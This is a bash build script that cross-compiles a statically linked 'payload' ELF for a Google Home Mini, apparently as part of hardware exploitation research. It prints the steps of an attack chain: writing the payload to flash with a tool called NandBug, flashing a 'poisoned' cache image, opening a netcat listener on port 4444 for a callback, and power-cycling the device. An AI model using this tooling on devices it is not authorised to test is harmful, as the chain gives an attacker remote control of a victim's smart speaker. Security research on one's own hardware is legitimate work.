#!/usr/bin/env bash
# Build the payload ELF for the Google Home Mini (ARM Linux, statically linked).
# Requires arm-linux-gnueabi-gcc (apt install gcc-arm-linux-gnueabi).
# Edit PI_IP / PI_PORT in agent_elf.c before building.

set -euo pipefail

OUT="payload_elf"

echo "[*] Checking cross-compiler …"
if ! command -v arm-linux-gnueabi-gcc &>/dev/null; then
    echo "[!] Install: sudo apt install gcc-arm-linux-gnueabi"
    exit 1
fi

echo "[*] Compiling payload …"
arm-linux-gnueabi-gcc \
    -static -Os -march=armv7-a -mthumb \
    -o "$OUT" agent_elf.c

echo "[+] Built: $OUT ($(du -h $OUT | cut -f1))"
file "$OUT"
echo ""
echo "Next:"
echo "  1. Copy $OUT to the Mini's NAND via NandBug:"
echo "     nandbug.py write --partition factory_store --file $OUT --dest factory_setting/s"
echo "  2. Flash the poisoned cache image:"
echo "     nandbug.py write --partition cache --in ../exploit/poisoned-cache.yaffs2"
echo "  3. Start a listener on the Pi:"
echo "     nc -lvp 4444"
echo "  4. Power-cycle the Mini. Success rate: ~5-10% per boot."
